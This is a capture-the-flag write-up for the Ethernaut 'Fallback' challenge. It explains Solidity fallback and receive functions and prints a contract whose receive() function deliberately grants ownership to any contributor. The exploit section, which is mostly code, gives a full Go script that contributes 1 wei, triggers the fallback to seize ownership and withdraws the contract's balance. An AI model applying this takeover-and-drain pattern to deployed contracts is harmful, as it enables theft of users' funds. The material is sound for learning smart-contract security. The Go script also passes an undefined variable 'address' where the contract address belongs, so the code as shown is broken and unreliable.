---
author: Nodauf
title: Ethernaut challenges - 1. Fallback
date: 2022-05-18
tags: ["ethernaut", "golang", "web3"]
image: /images/openzeppelin-logo.svg
categories: "ethernaut"
description: Writeup of "1. Fallback" challenge Ethernaut
---

# Introduction

This challenge introduce the notion of fallback in Solidity.

> A contract can have exactly one unnamed function (for solidity version prior 0.6.0, otherwise the fallback function has the keyword `fallback`). This function cannot have arguments, cannot return anything and has to have external visibility. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all) - [source](https://docs.soliditylang.org/en/v0.5.3/contracts.html) and [source for solidity > 0.6.0](https://blog.soliditylang.org/2020/03/26/fallback-receive-split/)

A fallback function looks like this

```solidity
contract Test {
	function() external payable {
		...
	}
	// or for solidity > 0.6.0
	fallback() external payable {
		...
    }
}
```

The source code of the challenge is

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  // [1]
  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  // [2]
  receive() external payable {
	// [3]
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

- `[1]`: The modifier onlyOwner is used to restrict the function to the owner of the contract. It can be used to apply a restriction to a function, this modifier is being use by the function `withdraw()`
- `[2]`: This is our fallback function. The keyword `receive()` has been introduced in solidity 0.6.0 to handle when a contract received ethers with no data. For more details a [blog post on soliditylang has been written](https://blog.soliditylang.org/2020/03/26/fallback-receive-split/)
- `[3]`: This condition check if ethers is sent in the transaction and if the sender has contributed to the contract with the function `contribute()`.

# The environment

Like for the previous challenge, we have to generate our golang file (see [the introduction post](../ethernaut) to know the structure of the writeups). This time we will use the solidity code.

The environment has to be configured, the [solc](https://github.com/ethereum/solc-bin/blob/gh-pages/linux-amd64/solc-linux-amd64-v0.7.6%2Bcommit.7338295f) binary (version 0.7.6 to match the contract requirements) and [abigen](https://geth.ethereum.org/downloads/) are needed.

```bash
mkdir ../1-Fallback
npm install @openzeppelin/contracts@3.4
solc --abi Fallback.sol -o . @openzeppelin/=$(pwd)/node_modules/@openzeppelin/
abigen --abi=./Fallback.abi --pkg=Fallback --out=../1-Fallback/1-Fallback.go

```

An optional but recommended step is to work on a fork of the blockchain for faster performance and easier debugging.

```bash
npx hardhat node --fork https://eth-rinkeby.alchemyapi.io/v2/<APIKEY>
#or
anvil --fork-url https://eth-rinkeby.alchemyapi.io/v2/<APIKEY>
```

# Exploitation

To validate the challenge, there are two steps:

1. you claim ownership of the contract
2. you reduce its balance to 0

The exploitation is straightforward, the fallback function can be called to update the owner of the contract and then the `withdraw()` function to reduce the balance of the contract to 0. Before calling the fallback function, we need to have contribute to have more than 0 in the contributions balance.

```go
package main

import (
	"context"
	"crypto/ecdsa"
	"flag"
	"fmt"
	"log"
	"math/big"

	store "ethernaut-golang/ethernautChallenges/1-Fallback"

	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

var fork bool

func main() {
	var blockchainURL, contractAddress, privateKey string
	flag.BoolVar(&fork, "fork", true, "Should we use the parameter for the fork blockchain ? (default: true)")
	flag.Parse()
	contractAddress = "0xbc81037C99ECAabf115405b76AE630AB2e753EfA"
	if fork {
		blockchainURL = "http://127.0.0.1:8545"
		privateKey = "ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
	} else {
		blockchainURL = "https://eth-rinkeby.alchemyapi.io/v2/<API-KEY>"
		privateKey = "<private key>"

	}
	// Connect to the node
	client, err := ethclient.Dial(blockchainURL)
	if err != nil {
		log.Fatal(err)
	}

	// Contract
	contractAddressHash := common.HexToAddress(contractAddress)
	instance, err := store.NewFallback(contractAddressHash, client)
	if err != nil {
		log.Fatal(err)
	}

	// Get the owner of the contract
	owner, _ := instance.Owner(nil)
	fmt.Println("owner:", owner)

	fmt.Println("1. Call contribute with 1 wei")
	auth := newTransactor(client, privateKey)
	// Update auth to send 1 wei
	auth.Value = big.NewInt(1) // in wei
	_, err = instance.Contribute(auth)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("2. Trigger the fallback function")
	signedTx := transactionFallback(client, privateKey, address)
	fmt.Printf("tx fallback: %s\n", signedTx.Hash())

	err = client.SendTransaction(context.Background(), signedTx)
	if err != nil {
		log.Fatal("SendTx: " + err.Error())
	}

	// Wait for the transaction to be mined and process by the blockchain
	bind.WaitMined(context.Background(), client, signedTx)
	fmt.Println("tx confirmed")

	// Check the owner
	owner, _ = instance.Owner(nil)
	fmt.Println("owner:", owner)

	fmt.Println("3. Withdraw everything")
	auth = newTransactor(client, privateKey)
	_, err = instance.Withdraw(auth)
	if err != nil {
		log.Fatal(err)
	}

}

// newTransactor creates a transaction signer based on the provided private key
func newTransactor(client *ethclient.Client, privateKeyStr string) *bind.TransactOpts {
	privateKey, err := crypto.HexToECDSA(privateKeyStr)
	if err != nil {
		log.Fatal(err)
	}

	publicKey := privateKey.Public()
	publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey)
	if !ok {
		log.Fatal("cannot assert type: publicKey is not of type *ecdsa.PublicKey")
	}

	fromAddress := crypto.PubkeyToAddress(*publicKeyECDSA)
	nonce, err := client.PendingNonceAt(context.Background(), fromAddress)
	if err != nil {
		log.Fatal(err)
	}

	gasPrice, err := client.SuggestGasPrice(context.Background())
	if err != nil {
		log.Fatal(err)
	}
	//fmt.Println("gasPrice:", gasPrice)
	//fmt.Println("nonce:", nonce)
	auth := bind.NewKeyedTransactor(privateKey)
	auth.Nonce = big.NewInt(int64(nonce))
	auth.Value = big.NewInt(0)      // in wei
	auth.GasLimit = uint64(2000000) // in units
	auth.GasPrice = gasPrice
	return auth

}

// transactionFallback creates a transaction to call the fallback function of the toAddress contract
func transactionFallback(client *ethclient.Client, privateKeyStr string, toAddress common.Address) *types.Transaction {
	privateKey, err := crypto.HexToECDSA(privateKeyStr)
	if err != nil {
		log.Fatal(err)
	}

	publicKey := privateKey.Public()
	publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey)
	if !ok {
		log.Fatal("cannot assert type: publicKey is not of type *ecdsa.PublicKey")
	}

	fromAddress := crypto.PubkeyToAddress(*publicKeyECDSA)
	nonce, err := client.PendingNonceAt(context.Background(), fromAddress)
	if err != nil {
		log.Fatal(err)
	}
	gasPrice, err := client.SuggestGasPrice(context.Background())
	if err != nil {
		log.Fatal(err)
	}

	var data []byte
	//tx := types.NewTransaction(nonce, toAddress, big.NewInt(5), uint64(2000000), gasPrice, data)
	var txData types.LegacyTx
	txData.Data = data
	txData.Nonce = nonce
	txData.To = &toAddress
	txData.Value = big.NewInt(5)
	txData.Gas = uint64(2000000)
	txData.GasPrice = gasPrice
	tx := types.NewTx(&txData)

	// Cannot get the networkID of the fork
	var chainID *big.Int
	if fork {
		chainID = big.NewInt(1)
	} else {
		chainID, err = client.NetworkID(context.Background())
		if err != nil {
			log.Fatal("networkID: " + err.Error())
		}
	}

	signedTx, err := types.SignTx(tx, types.NewEIP155Signer(chainID), privateKey)
	if err != nil {
		log.Fatal(err)
	}
	return signedTx
}

```
